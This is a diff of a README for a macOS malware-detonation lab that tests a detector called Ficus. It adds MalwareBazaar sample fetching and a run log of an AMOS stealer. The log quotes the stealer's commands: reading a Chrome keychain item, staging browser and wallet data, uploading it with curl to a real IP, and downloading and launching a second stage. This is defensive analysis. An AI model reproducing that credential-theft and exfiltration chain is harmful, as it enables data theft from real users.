@@ -13,7 +13,8 @@ Authorized use only: your own lab, your own Mac. Never extract or run samples on
 | `lab-net.py` | Starts a gateway VM and a sample VM joined by a private socket-pair cable (`tart run --net-fd`). The host is not on that network. |
 | `check-isolation.sh` | Proves the sample VM reaches only the gateway. Run before any sample. |
 | `lib.sh`, `events.txt` | Shared shell functions (data folder, slugs, sample URL, run ids, name checks) and the list of eslogger events to record. |
-| `fetch-sample.sh` | Downloads one sample zip from objective-see/malware into `$FICUS_LAB_DATA/samples/` and adds a row (family, zip, sha256, recipe, window) to `manifest.tsv`. Never extracts it. |
+| `fetch-sample.sh` | Downloads one sample zip from objective-see/malware into `$FICUS_LAB_DATA/samples/` and adds a row (family, zip, sha256, recipe, window, notes, source `objective-see`) to `manifest.tsv`. Never extracts it. |
+| `fetch-bazaar.sh` | `search` lists recent MalwareBazaar samples by file type or tag; `get SHA256` downloads one and adds a manifest row with source `bazaar`. Needs your abuse.ch Auth-Key in `ABUSE_CH_KEY`; the key goes to curl on standard input, so it is on no command line and in no file. Never extracts it. |
 | `lab-run.sh` | The one-command run: clone both VMs, cable, isolation check, eslogger streaming to the host, unzip in the guest, launch by recipe, wait, collect post-state and pcap, delete the clones. Writes `runs/<name>/<run-id>/`. |
 | `guest-collect.sh` | Runs in the guest after a run: BTM items, launch agent and daemon folders, crontabs, process list. |
 | `guest-benign.sh` | Runs in the guest for `lab-run.sh --baseline benign`: ordinary activity (recon, developer tools, files, zip and tar, a curl download, a preference, an SSH key, an empty package install, an app, launchctl, Python). Nothing in it is an attack. |
@@ -92,7 +93,9 @@ A zip holding a script that writes a fake launch agent, fetches a file from the 
 - **The summarizer merges identical findings into one row with a `count`** (and says how many findings Ficus produced and how long its triage queue is). Merging without a count hid a 1,056-item queue behind four rows the first time.
 - **Ficus's global sequence-gap count is useless on a lab capture**: the harness removes unmodified `close` events, which leaves tens of thousands of holes (30,514 in the stand-in run). The summarizer counts drops per event type instead, which are gapless in a complete capture (0 in that run).
 - **Ficus has no rule for `xp_malware_detected`, `tcc_modify` or `gatekeeper_user_override`**, although its guide lists them as events to record. XProtect detections are high-value evidence; a candidate rule for Task 10.
-- **macOS `unzip` opened the first real objective-see zip (KoiStealer)**, so those are the older ZipCrypto encryption. MalwareBazaar's zips are AES (compression type 99), which macOS `unzip` cannot open.
+- **macOS `unzip` opened the first real objective-see zip (KoiStealer)**, so those are the older ZipCrypto encryption. MalwareBazaar's zips are AES (compression type 99), which macOS `unzip` cannot open: `lab-run.sh` opens rows whose `source` is `bazaar` with `7zz x -pinfected` in the guest, so the main image (which has 7-Zip) is needed; the lean image has none. Confirmed on the first Bazaar sample.
+- **The `source` column of `manifest.tsv`** (`objective-see` or `bazaar`; a row without it counts as `objective-see`) picks the extraction and the password (`infect3d` or `infected`), and `meta.json` records it.
+- **The abuse.ch key.** `fetch-bazaar.sh` reads `ABUSE_CH_KEY` from the environment only. If you paste the key anywhere (a chat, a terminal log), regenerate it on abuse.ch afterwards.
 - **A `manual` recipe means a window and a wait**, and the run folder then holds your own commands. Inspect a sample first with read-only commands (`file`, `codesign -dvv`, `strings`, `otool -L`) through `tart exec`, never on the host.
 - **`tart exec` commands that need a permission trigger a prompt in the guest**: a `screencapture` through the guest agent raised a Screen Recording prompt. Harmless (the clone is thrown away), but it shows in screenshots.
 
@@ -124,5 +127,13 @@ Full write-up: `lab/reports/2026-11-19-heartbreaker.md`.
 - **Ficus:** `persistence-item` (high), `shell-from-pipe` (medium), `odd-location-exec` (high, partly the lab's own placement in `~/Downloads`), `unsigned`, `adhoc`, `orphaned`, `recon`. **Nothing for the encryption itself.** Against the article: hit 1, miss 0, gap 4, review 2; triage queue of 3 items.
 - **Ficus quirk:** once the sample renamed its own running binary, Ficus saw the process as a second, unsigned program (`heartbreaker.heartbreaker`), duplicating three findings.
 - **Rule candidate:** a burst of renames by one non-Apple process that all add the same new extension, to be tested against the benign baseline first.
+
+### AMOS from MalwareBazaar (2026-11-19, sha256 `fdcd5d21…`, 442 KB universal Mach-O, `manual` recipe, main guest image)
+
+First sample from MalwareBazaar and the first run on the developer image. Full write-up: `lab/reports/2026-11-19-amos-fdcd5d21.md`.
+
+- **It did a complete theft in 0.8 seconds, with no password dialog and no persistence.** Through `sh -c`: `security find-generic-password -ga "Chrome"`, `system_profiler`, copies of browser, Firefox, wallet, Notes and shell data into `/tmp/lksopo/`, `ditto -c -k` of it, `curl -X POST --data-binary @… http://85.193.68.244/log` (66,298 bytes, with `buildid` and `username` headers), cleanup, then `curl -o /tmp/binaryexe http://85.193.68.245/web/bot`, `chmod +x` and a background start. Its strings are hidden; only the run shows anything.
+- **Ficus:** 15 findings under the sample, 6 high (`credential-store-copy`, `keychain-access`, `archive-staging`, `odd-location-exec`), a triage queue of 15 items. Against an article about a related, script-based AMOS: hit 5, miss 4 (the fake dialog, the password check and the persistence this build did not show), gap 3. **No rule for the upload with `curl`.**
+- **Lab caveats:** the Chrome keychain item was readable without a prompt because my bait item was made with `security`; the lab's C2 returns a 404 page, so the second stage was an HTML file.
 
 Not built yet: more pilot runs and the rule fixes. See the plan, Tasks 9 and 10.
